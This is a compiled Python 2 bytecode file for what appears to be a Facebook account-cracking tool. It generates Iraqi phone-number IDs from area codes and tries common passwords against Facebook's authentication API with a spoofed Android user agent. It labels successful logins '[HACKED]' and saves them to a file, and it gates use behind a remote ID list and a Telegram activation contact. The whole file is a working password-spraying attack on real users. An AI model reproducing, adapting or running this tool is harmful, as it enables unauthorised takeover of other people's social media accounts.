ó
o`c           @   s  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z e  j d  xJ e d  D]< Z e j d d  Z e d d  e _ e GHe j j   qª Wy d  d l Z Wn e k
 re  j d  n Xy d  d l Z Wn8 e k
 ree  j d	  e j d
  e  j d  n Xd  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l m Z d  d l m Z d  d l m Z e e  e j d  e j   Z e j  e!  e j" e j# j$   d d
 d5 g e _% d6 g e _% e  j d  e  j d  e  j d  e d d  Z& x e& D] Z' e' j(   Z) qÓWe j* d  Z+ e+ j, Z- d   Z. d   Z/ d   Z0 d   Z1 d   Z2 d    Z3 d! Z4 g  a5 g  Z6 g  a7 d" Z8 d# Z9 e  j d  d$ Z: d% Z; d& Z< d& Z= e  j d  e; GHd' Z> xl e> d' k re? d(  Z@ e@ e< k rþe? d)  ZA eA e= k röd* e@ GHe j d+  d, Z> qd- GHqd. GHqWd/   ZB d0   ZC d1   ZD xt e- j(   D]4 ZE eE GHeE e) d! k r/eF d2 k rceC   qcq/q/We  j d  d3 ZG eG GHd4 e) d! GHe  j jH   d S(7   iÿÿÿÿNs   rm -rf .txti  iGô i s   .txtt   as,   No Module Named wget! type:pip2 install wgets6   No Module Named Mechanize! type:pip2 install mechanizei   s   Then type: python2 FB.py(   t
   ThreadPool(   t   ConnectionError(   t   Browsert   utf8t   max_times
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]t   clears   rm -rf list.txts   id -u > list.txts   list.txtt   rs;   https://raw.githubusercontent.com/kakdlovan9/1/main/req.txtc           C   s   d GHt  j j   d  S(   Ns   Thanks.(   t   ost   syst   exit(    (    (    s	   dlovan.pyt   keluar)   s    c         C   sS   d } d } x: t  D]2 } | d | t j d t |  d  | 7} q Wt |  S(   Nt   ahtdzjct    t   !i    i   (   t   xt   randomt   randintt   lent   cetak(   t   bt   wt   dt   i(    (    s	   dlovan.pyt   acak.   s
    0c         C   s~   d } xA | D]9 } | j  |  } | j d | d t d |   } q W| d 7} | j d d  } t j j | d  d  S(   NR   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replacet   strR	   t   stdoutt   write(   R   R   R   t   jR   (    (    s	   dlovan.pyR   7   s    (
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¹?(   R	   R   R   t   flusht   timet   sleep(   t   zt   e(    (    s	   dlovan.pyt   jalanB   s    c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s   [1;94mWaiting... [1;93mi   (   R	   R   R   R    R!   (   t   titikt   o(    (    s	   dlovan.pyt   tikI   s
    c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¸ëQ¸?(   R	   R   R   R   R    R!   (   R"   R#   (    (    s	   dlovan.pyt   psbQ   s    i    s   [31mNot Vulns	   [32mVulns    

        sN                                                                        

       t   1t   trues!   [1;97mâ£[31;1mTOOL USERNAME: s!   [1;97mâ£[31;1mTOOL PASSWORD: s   [1;92m[â] Tawawa  i   t   falses   Pass Halayas   User Halayac           C   s   t  j d  t   d  S(   NR   (   R   t   systemt   menu(    (    (    s	   dlovan.pyt   lisensiy   s    c           C   s"   t  j d  t GHd GHt   d  S(   NR   s   [93m   [1] start(   R   R,   t   logot   action(    (    (    s	   dlovan.pyR-      s    c             sO  t  d  }  |  d k r' d GHt   n|  d k rÓ t j d  t GHd d GHd d GHyO t  d	    d
  d } x0 t | d  j   D] } t j | j	    q WWq¯t
 k
 rÏ d GHt  d  t   q¯XnÜ|  d k r{t j d  t GHd d GHd# GHyO t  d    d
  d } x0 t | d  j   D] } t j | j	    q0WWq¯t
 k
 rwd GHt  d  t   q¯Xn4|  d k r#t j d  t GHd d GHd GHyO t  d    d
  d } x0 t | d  j   D] } t j | j	    qØWWq¯t
 k
 rd GHt  d  t   q¯Xn|  d k rñt j d  t GHd d GHd$ GHyO t  d    d
  d } x0 t | d  j   D] } t j | j	    qWWq¯t
 k
 rÇd GHt  d  t   q¯t
 k
 ríd GHt  d  t   q¯Xn¾|  d k r¿t j d  t GHd d GHd% GHyO t  d    d
  d } x0 t | d  j   D] } t j | j	    qNWWq¯t
 k
 rd GHt  d  t   q¯t
 k
 r»d GHt  d  t   q¯Xnð |  d k rt j d  t GHd d GHd& GHyO t  d    d
  d } x0 t | d  j   D] } t j | j	    qWWq¯t
 k
 rcd GHt  d  t   q¯t
 k
 rd GHt  d  t   q¯Xn" |  d k r£t   n d GHt   t t t   } t d |  d GH   f d   } t d  } | j | t  d GHd GHd t t t   d  t t t   GHd! GHt  d"  t   d  S('   Ns(   
[1;91mHalbzhera ba daf3 nabm : [1;97mR   s   [!] Fill In CorrectlyR)   R   s   [1;97mZhmarayak halbzheras   
s$   [1;97m770 750 780 751 752 753 773  s   [1;97mKodek Halbzhera : s   +964s   .txtR   s   [!] File Not Founds	   
[ Back ]t   2s   [1;97mArea Codes With Networks   [1;97m 770 750 780s   [1;97mCODE HALBZHERA : t   3s   [1;97m 770 750 780
t   4t   6t   7t   0s   [â] HAMU RAQAMAKAN: s,   [31;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~c   
         s¨  |  } y t  j d  Wn t k
 r* n Xyod } t j d    | d | d  } t j |  } d | k rÝ d    | d | GHt d	 d
  } | j    | | d  | j   t	 j
   | |  n¼d } t j d    | d | d  } t j |  } d | k rd    | d | GHt d	 d
  } | j    | | d  | j   t	 j
   | |  n| } t j d    | d | d  } t j |  } d | k r;d    | d | GHt d	 d
  } | j    | | d  | j   t	 j
   | |  n^d } t j d    | d | d  } t j |  } d | k rêd    | d | GHt d	 d
  } | j    | | d  | j   t	 j
   | |  n¯ d }	 t j d    | d |	 d  } t j |  } d | k rd    | d |	 GHt d	 d
  } | j    | |	 d  | j   t	 j
   | |	  n  Wn n Xd  S(   Ns   0.1t
   1122334455s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efmt   access_tokens   [1;92m[HACKED]  s     [1;92m|  s   anggaxd/clone.txtR    s   
t   123456123456t   123456654321t
   1234554321(   R    t   sleppt   OSErrort   brt   opent   jsont   loadR   t   closet   okst   append(
   t   argt   usert   pass1t   datat   qt   okbt   pass2t   pass3t   pass4t   pass5(   t   ct   k(    s	   dlovan.pyt   main  sj    '
'
'
'
'
i   s9   [1;97m--------------------------------------------------s$   [â] Process Has Been Completed ...s&   [â] Total Successfully/Checkpoint : t   /s8   [â] Cloned Accounts Has Been Saved : anggaxd/clone.txts   
[1;97m[[1;97mBack[1;95m]s   [1;97m 770 750 780
s   [1;97m 770 750 780
s   [1;97m 770 750 780
s   [1;97m 770 750 780
(   t	   raw_inputR0   R   R,   R/   R?   t	   readlinest   idRD   t   stript   IOErrorR-   R   R   R(   R   t   mapRC   t   cpb(   t   peakt   idlistt   linet   xxxRQ   t   p(    (   RO   RP   s	   dlovan.pyR0      sô    
		
	
	
	


	


	



>)
t   __main__sh     your id is not active 
  id kat active nakrwa bo active  krdn massge  bkan 
  telegram : @kak_dlovan

s    [+] your id is >>>> (   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(   s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;](I   R   R	   R    t   datetimeR   t   hashlibt   ret	   threadingR@   t   urllibt	   cookielibt   getpassR,   t   ranget   nR   t   nmbrR?   R   R   t   requestst   ImportErrort	   mechanizeR!   t   multiprocessing.poolR   t   requests.exceptionsR   R   t   reloadt   setdefaultencodingR>   t   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheaderst   uiddR   t   splitt   spt   gett   manglistt   textt   iddR   R   R   R$   R'   R(   t   backRC   RU   RY   t   vulnott   vulnR/   t   logo2t   CorrectUsernamet   CorrectPasswordt   loopRS   t   usernamet   passwordR.   R-   R0   t   st   __name__t   baniR
   (    (    (    s	   dlovan.pyt   <module>   s   
														Ì